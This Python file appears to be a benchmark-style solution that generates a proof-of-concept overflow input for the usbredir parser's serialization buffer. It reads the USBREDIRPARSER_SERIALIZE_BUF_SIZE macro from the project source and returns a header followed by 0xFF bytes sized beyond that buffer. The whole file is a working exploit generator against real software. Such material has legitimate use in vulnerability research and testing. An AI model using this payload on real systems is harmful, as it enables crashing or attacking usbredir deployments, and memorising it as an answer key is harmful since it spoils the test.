import os
import re
import ast
import tarfile
from typing import Optional


class Solution:
    def _safe_eval_int_expr(self, expr: str) -> Optional[int]:
        if not expr:
            return None
        expr = expr.strip()
        expr = expr.split("//", 1)[0].strip()
        expr = expr.split("/*", 1)[0].strip()

        expr = re.sub(r"\b([0-9]+)\s*(?:ULL|LLU|UL|LU|LL|U|L)\b", r"\1", expr)
        expr = expr.strip()
        if not expr:
            return None

        if re.search(r"[A-WY-Za-wy-z_]", expr):
            return None

        try:
            node = ast.parse(expr, mode="eval")
        except Exception:
            return None

        allowed_nodes = (
            ast.Expression,
            ast.BinOp,
            ast.UnaryOp,
            ast.Add,
            ast.Sub,
            ast.Mult,
            ast.FloorDiv,
            ast.Div,
            ast.LShift,
            ast.RShift,
            ast.BitOr,
            ast.BitAnd,
            ast.BitXor,
            ast.USub,
            ast.UAdd,
            ast.Invert,
            ast.Constant,
            ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
        )

        def _eval(n):
            if isinstance(n, ast.Expression):
                return _eval(n.body)
            if isinstance(n, ast.Constant):
                if isinstance(n.value, bool):
                    return int(n.value)
                if isinstance(n.value, int):
                    return int(n.value)
                return None
            if isinstance(n, ast.UnaryOp):
                v = _eval(n.operand)
                if v is None:
                    return None
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                if isinstance(n.op, ast.Invert):
                    return ~v
                return None
            if isinstance(n, ast.BinOp):
                a = _eval(n.left)
                b = _eval(n.right)
                if a is None or b is None:
                    return None
                op = n.op
                if isinstance(op, ast.Add):
                    return a + b
                if isinstance(op, ast.Sub):
                    return a - b
                if isinstance(op, ast.Mult):
                    return a * b
                if isinstance(op, (ast.Div, ast.FloorDiv)):
                    if b == 0:
                        return None
                    return a // b
                if isinstance(op, ast.LShift):
                    if b < 0 or b > 63:
                        return None
                    return a << b
                if isinstance(op, ast.RShift):
                    if b < 0 or b > 63:
                        return None
                    return a >> b
                if isinstance(op, ast.BitOr):
                    return a | b
                if isinstance(op, ast.BitAnd):
                    return a & b
                if isinstance(op, ast.BitXor):
                    return a ^ b
                return None
            return None

        def _validate(n) -> bool:
            if isinstance(n, ast.AST):
                if not isinstance(n, allowed_nodes):
                    return False
                for c in ast.iter_child_nodes(n):
                    if not _validate(c):
                        return False
                return True
            return False

        if not _validate(node):
            return None

        val = _eval(node)
        if val is None:
            return None
        if not (0 <= val <= 1 << 30):
            return None
        return int(val)

    def _extract_define_from_text(self, text: str, name: str) -> Optional[int]:
        pat = re.compile(r"^\s*#\s*define\s+" + re.escape(name) + r"\s+(.+?)\s*$", re.M)
        m = pat.search(text)
        if not m:
            return None
        expr = m.group(1).strip()
        expr = expr.split("//", 1)[0].strip()
        expr = expr.split("/*", 1)[0].strip()
        val = self._safe_eval_int_expr(expr)
        return val

    def _get_serialize_buf_size(self, src_path: str) -> int:
        macro = "USBREDIRPARSER_SERIALIZE_BUF_SIZE"
        default = 64 * 1024

        def try_text(text: str) -> Optional[int]:
            return self._extract_define_from_text(text, macro)

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.endswith((".h", ".c", ".cc", ".cpp")):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        if os.path.getsize(p) > 1_000_000:
                            continue
                        with open(p, "rb") as f:
                            data = f.read()
                    except Exception:
                        continue
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    v = try_text(text)
                    if v is not None:
                        return v
            return default

        if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf:
                        if not m.isfile():
                            continue
                        n = m.name.lower()
                        if not (n.endswith(".h") or n.endswith(".c") or n.endswith(".cc") or n.endswith(".cpp")):
                            continue
                        if m.size <= 0 or m.size > 1_000_000:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        text = data.decode("utf-8", errors="ignore")
                        v = try_text(text)
                        if v is not None:
                            return v
            except Exception:
                return default

        return default

    def solve(self, src_path: str) -> bytes:
        buf_size = self._get_serialize_buf_size(src_path)

        extra = max(6000, buf_size // 8)
        total_len = buf_size + extra

        header = bytes([0x00, 0x01, 0x01, 0x00])
        if total_len < len(header) + 1:
            total_len = len(header) + 1

        out = bytearray(total_len)
        out[:4] = header
        out[4:] = b"\xFF" * (total_len - 4)
        return bytes(out)